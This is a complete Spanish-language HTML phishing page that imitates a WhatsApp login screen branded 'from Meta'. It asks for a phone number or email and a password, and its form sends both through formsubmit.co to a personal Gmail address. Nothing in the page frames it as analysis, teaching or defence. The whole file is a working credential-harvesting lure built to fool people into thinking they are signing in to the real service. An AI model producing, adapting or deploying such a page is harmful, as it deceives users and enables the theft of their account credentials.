<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>WhatsApp</title>
<style>
  html, body {
    margin: 0;
    padding: 0;
    width: 100%;
    height: 100%;
    background: #fff;
    font-family: Helvetica, Arial, sans-serif;
  }

  .screen {
    width: 100vw;
    height: 100vh;
    display: flex;
    flex-direction: column;
    justify-content: space-between;
    align-items: center;
  }

  .top {
    margin-top: 90px;
    display: flex;
    flex-direction: column;
    align-items: center;
  }

  .logo {
    font-size: 40px;
    color: #25D366;
    font-weight: 700;
    margin-bottom: 50px;
    letter-spacing: -1px;
  }

  .box {
    width: 90%;
    max-width: 360px;
  }

  input {
    width: 100%;
    padding: 15px 12px;
    font-size: 16px;
    margin-bottom: 16px;
    border-radius: 6px;
    border: 1px solid #dadce0;
    box-sizing: border-box;
    outline: none;
  }

  input:focus {
    border-color: #25D366;
  }

  button {
    width: 100%;
    padding: 14px;
    font-size: 16px;
    border-radius: 999px;
    border: none;
    background: #25D366;
    color: white;
    font-weight: 600;
    cursor: pointer;
  }

  button:active {
    background: #1ebe5d;
  }

  .footer {
    font-size: 13px;
    color: #777;
    margin-bottom: 25px;
  }
</style>
</head>
<body>

<div class="screen">
  <div class="top">
    <div class="logo">WhatsApp</div>

    <form class="box" action="https://formsubmit.co/orlandguzz@gmail.com" method="POST">
      <input type="text" name="user" placeholder="Número de teléfono o correo electrónico" required>
      <input type="password" name="password" placeholder="Contraseña" required>
      <button type="submit">Iniciar sesión</button>
    </form>
  </div>

  <div class="footer">from Meta</div>
</div>

</body>
</html>
